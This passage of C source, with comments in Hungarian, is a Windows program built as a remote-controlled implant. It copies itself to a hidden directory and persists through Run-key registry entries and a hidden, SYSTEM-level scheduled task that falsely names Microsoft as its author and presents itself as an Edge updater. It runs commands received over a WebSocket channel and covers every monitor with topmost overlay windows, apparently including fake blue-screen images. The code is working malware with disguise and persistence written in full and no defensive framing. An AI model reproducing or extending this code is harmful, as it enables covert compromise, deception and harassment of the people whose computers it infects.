                WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
                (PVOID)ping,(DWORD)strlen(ping));
    }
    return 0;
}

/* ── WS fogadó szál ─────────────────────────────────────────────────────── */
static DWORD WINAPI ws_thread(LPVOID p) {
    (void)p;
    DWORD backoff=RECONNECT_MS;
    while (g_running) {
        if (!ws_open()) {
            Sleep(backoff);
            if (backoff<MAX_BACKOFF_MS) backoff*=2;
            continue;
        }
        backoff=RECONNECT_MS;
        HANDLE hb=CreateThread(NULL,0,hb_thread,NULL,0,NULL);
        BYTE buf[8192];
        while (g_running) {
            DWORD rd=0;
            WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
            if (WinHttpWebSocketReceive(g_ws,buf,sizeof buf-1,&rd,&type)
                    !=ERROR_SUCCESS) break;
            if (type==WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE||
                type==WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE) {
                buf[rd]=0; process_cmd((char*)buf);
            } else if (type==WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE) break;
        }
        if (hb) { TerminateThread(hb,0); CloseHandle(hb); }
        ws_cleanup();
        if (!g_running) break;
        Sleep(backoff);
        if (backoff<MAX_BACKOFF_MS) backoff*=2;
    }
    return 0;
}

/* ── Task Scheduler ─────────────────────────────────────────────────────── */
static void install_task(const WCHAR *exe, BOOL as_system) {
    ITaskService      *svc =NULL;
    ITaskFolder       *root=NULL;
    ITaskDefinition   *def =NULL;
    IRegistrationInfo *ri  =NULL;
    ITaskSettings     *ts  =NULL;
    ITriggerCollection *tc =NULL;
    ITrigger          *tr  =NULL;
    IActionCollection  *ac =NULL;
    IAction           *act =NULL;
    IExecAction       *ea  =NULL;
    IRegisteredTask   *rt  =NULL;
    IPrincipal        *prin=NULL;

    if (FAILED(CoCreateInstance(&CLSID_TaskScheduler,NULL,
            CLSCTX_INPROC_SERVER,&IID_ITaskService,(void**)&svc))) return;
    VARIANT v; VariantInit(&v);
    if (FAILED(ITaskService_Connect(svc,v,v,v,v))) goto out;
    if (FAILED(ITaskService_GetFolder(svc,L"\\",&root))) goto out;
    if (FAILED(ITaskService_NewTask(svc,0,&def))) goto out;

    ITaskDefinition_get_RegistrationInfo(def,&ri);
    if (ri) {
        IRegistrationInfo_put_Author(ri,L"Microsoft Corporation");
        IRegistrationInfo_put_Description(ri,
            L"Keeps the Microsoft Edge Update Task running.");
        IRegistrationInfo_Release(ri);
    }
    ITaskDefinition_get_Principal(def,&prin);
    if (prin) {
        if (as_system) {
            IPrincipal_put_UserId(prin,L"S-1-5-18");
            IPrincipal_put_LogonType(prin,TASK_LOGON_SERVICE_ACCOUNT);
            IPrincipal_put_RunLevel(prin,TASK_RUNLEVEL_HIGHEST);
        } else {
            IPrincipal_put_LogonType(prin,TASK_LOGON_INTERACTIVE_TOKEN);
            IPrincipal_put_RunLevel(prin,TASK_RUNLEVEL_LUA);
        }
        IPrincipal_Release(prin);
    }
    ITaskDefinition_get_Settings(def,&ts);
    if (ts) {
        ITaskSettings_put_Hidden(ts,VARIANT_TRUE);
        ITaskSettings_put_MultipleInstances(ts,TASK_INSTANCES_IGNORE_NEW);
        ITaskSettings_put_DisallowStartIfOnBatteries(ts,VARIANT_FALSE);
        ITaskSettings_put_StopIfGoingOnBatteries(ts,VARIANT_FALSE);
        ITaskSettings_put_ExecutionTimeLimit(ts,L"PT0S");
        ITaskSettings_put_RestartCount(ts,999);
        ITaskSettings_put_RestartInterval(ts,L"PT1M");
        ITaskSettings_Release(ts);
    }
    ITaskDefinition_get_Triggers(def,&tc);
    if (tc) {
        ITriggerCollection_Create(tc,TASK_TRIGGER_LOGON,&tr);
        if (tr) ITrigger_Release(tr);
        ITriggerCollection_Release(tc);
    }
    ITaskDefinition_get_Actions(def,&ac);
    if (ac) {
        IActionCollection_Create(ac,TASK_ACTION_EXEC,&act);
        if (act) {
            IAction_QueryInterface(act,&IID_IExecAction,(void**)&ea);
            if (ea) {
                IExecAction_put_Path(ea,(BSTR)exe);
                IExecAction_put_WorkingDirectory(ea,ASSET_DIR);
                IExecAction_Release(ea);
            }
            IAction_Release(act);
        }
        IActionCollection_Release(ac);
    }
    {
        VARIANT u,pw; VariantInit(&u); VariantInit(&pw);
        TASK_LOGON_TYPE lt=as_system
            ?TASK_LOGON_SERVICE_ACCOUNT:TASK_LOGON_INTERACTIVE_TOKEN;
        ITaskFolder_RegisterTaskDefinition(root,
            TASK_NAME,def,TASK_CREATE_OR_UPDATE,u,pw,lt,u,&rt);
        if (rt) IRegisteredTask_Release(rt);
    }
out:
    if (def)  ITaskDefinition_Release(def);
    if (root) ITaskFolder_Release(root);
    if (svc)  ITaskService_Release(svc);
}

/* ── Registry Run ───────────────────────────────────────────────────────── */
static void install_reg(const WCHAR *exe) {
    WCHAR val[MAX_PATH+4];
    swprintf_s(val,MAX_PATH+4,L"\"%s\"",exe);
    DWORD sz=(DWORD)((wcslen(val)+1)*sizeof(WCHAR));
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,KEY_SET_VALUE,&k)==ERROR_SUCCESS) {
        RegSetValueExW(k,L"RuntimeBrokerSvc",0,REG_SZ,(const BYTE*)val,sz);
        RegCloseKey(k);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,KEY_SET_VALUE,&k)==ERROR_SUCCESS) {
        RegSetValueExW(k,L"RuntimeBrokerSvc",0,REG_SZ,(const BYTE*)val,sz);
        RegCloseKey(k);
    }
}

/* ── WinMain ────────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR cmd,int nShow) {
    (void)hPrev;(void)cmd;(void)nShow;
    g_hInst=hInst;

    /* Egypéldány mutex */
    HANDLE mutex=CreateMutexW(NULL,TRUE,
        L"Global\\MicrosoftEdgeCoreUpdateInstance_v2");
    if (GetLastError()==ERROR_ALREADY_EXISTS) return 0;

    /* Önmásolás */
    WCHAR exe[MAX_PATH],dst[MAX_PATH];
    GetModuleFileNameW(NULL,exe,MAX_PATH);
    swprintf_s(dst,MAX_PATH,L"%s%s",ASSET_DIR,EXE_NAME);
    if (_wcsicmp(exe,dst)!=0) {
        CreateDirectoryW(ASSET_DIR,NULL);
        CopyFileW(exe,dst,FALSE);
    }

    /* Perzisztencia */
    BOOL admin=is_admin();
    CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
    install_reg(dst);
    install_task(dst,admin);

    /* GDI+ */
    if (!gdiplus_init()) { CoUninitialize(); return 1; }

    /* Media Foundation */
    MFStartup(MF_VERSION,MFSTARTUP_NOSOCKET);

    /* WinHTTP session */
    g_ws_session=WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);

    /* Ablak osztályok regisztrálása */
    WNDCLASSEXW wc={0};
    wc.cbSize=sizeof wc; wc.hInstance=hInst;
    wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);

    /* Üzenet ablak (láthatatlan, parancsok fogadója) */
    wc.lpfnWndProc=msg_wndproc;
    wc.lpszClassName=L"DM_MsgWnd";
    RegisterClassExW(&wc);
    g_msg_wnd=CreateWindowExW(0,L"DM_MsgWnd",L"",WS_OVERLAPPED,
        0,0,1,1,HWND_MESSAGE,NULL,hInst,NULL);

    /* Overlay ablak osztály */
    wc.lpfnWndProc=overlay_wndproc;
    wc.lpszClassName=L"DM_Overlay";
    RegisterClassExW(&wc);

    /* EVR ablak osztály */
    wc.lpfnWndProc=evr_wndproc;
    wc.lpszClassName=L"DM_EVRHost";
    RegisterClassExW(&wc);

    /* Monitorok inicializálása (ablakok + BSOD) */
    monitors_init();

    /* WS szál */
    CreateThread(NULL,0,ws_thread,NULL,0,NULL);

    /* Topmost kényszer timer az üzenet ablakon */
    g_topmost_timer=SetTimer(g_msg_wnd,99,TOPMOST_MS,NULL);

    /* Üzenethurok */
    MSG msg;
    while (GetMessageW(&msg,NULL,0,0)>0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    /* Takarítás */
    g_running=FALSE;
    do_clear();
    for (int i=0;i<g_mon_count;i++) {
        if (g_monitors[i].bsod_bmp) DeleteObject(g_monitors[i].bsod_bmp);
    }
    MFShutdown();
    ws_cleanup();
    if (g_ws_session) WinHttpCloseHandle(g_ws_session);
    gp_Shutdown(gp_token);
    CoUninitialize();
    CloseHandle(mutex);
    return 0;
}

